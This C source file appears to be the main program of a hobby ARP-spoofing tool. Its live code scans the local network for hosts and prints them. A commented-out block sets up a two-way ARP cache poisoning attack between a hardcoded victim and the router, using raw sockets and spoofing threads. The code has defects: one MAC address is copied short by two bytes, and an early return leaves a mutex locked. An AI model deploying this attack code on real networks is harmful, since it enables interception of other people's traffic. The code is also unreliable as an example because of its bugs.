#include "spoofer.h"
#include "config.h"
#include "network_scanner.h"

int main() {
    scan_network_for_hosts();
    sleep(30);

	pthread_mutex_lock(&num_hosts_mutex);
    printf("Number of Hosts: %d\n", num_hosts);
    pthread_mutex_unlock(&num_hosts_mutex);


    pthread_mutex_lock(&hosts_array_mutex);
    if (!hosts_array) {
        printf("No hosts found.\n");
        return 1;
    }
    pthread_mutex_unlock(&hosts_array_mutex);

    pthread_mutex_lock(&num_hosts_mutex);
    pthread_mutex_lock(&hosts_array_mutex);
    for (int i = 0; i < num_hosts; i++) {
        char str_ip[INET_ADDRSTRLEN];

        inet_ntop(AF_INET, &hosts_array[i].ip_addr, str_ip, INET_ADDRSTRLEN);
        printf("Host %d: IP = %s, Name = %s\n", i + 1, str_ip, hosts_array[i].name);
    }
    pthread_mutex_unlock(&num_hosts_mutex);
    pthread_mutex_unlock(&hosts_array_mutex);


    free(hosts_array);
    return 0;
}
    /*
    int sock_fd = create_raw_socket(ARP_PROTOCOL);
    if (sock_fd == -1) {
        perror("socket");
        return 1;
    }

    uint8_t victim_mac[6];
    memcpy(victim_mac, VICTEM_MAC_HEX, 6);
    uint8_t victim_ip[4];
    memcpy(victim_ip, LOCAL_IP, 4);

    uint8_t router_mac[6];
    memcpy(router_mac, ROUTER_MAC_HEX, 4);
    uint8_t router_ip[4];
    memcpy(router_ip, ROUTER_IP_HEX, 4);

    uint8_t fake_mac[6];
    memcpy(fake_mac, LOCAL_MAC_HEX, 6);

    unsigned int ifindex = if_nametoindex("wlp2s0"); // change to your interface
    if (ifindex == 0) {
        perror("if_nametoindex");
        return 1;
    }

    thread_spoof_args_t to_target = {sock_fd, ifindex, {0}, {0}, {0}, {0}};
    memcpy(to_target.target_mac, victim_mac, 6);
    memcpy(to_target.target_ip, victim_ip, 4);
    memcpy(to_target.spoofed_ip, router_ip, 4);
    memcpy(to_target.spoofed_mac, fake_mac, 6);

    thread_spoof_args_t to_router = {sock_fd, ifindex, {0}, {0}, {0}, {0}};
    memcpy(to_router.target_mac, router_mac, 6);
    memcpy(to_router.target_ip, router_ip, 4);
    memcpy(to_router.spoofed_ip, victim_ip, 4);
    memcpy(to_router.spoofed_mac, fake_mac, 6);

    pthread_t thread1, thread2;
    pthread_create(&thread1, NULL, spoof_thread, &to_target);
    sleep(1);
    pthread_create(&thread2, NULL, spoof_thread, &to_router);

    pthread_join(thread1, NULL);
    pthread_join(thread2, NULL);

    return 0;
}
*/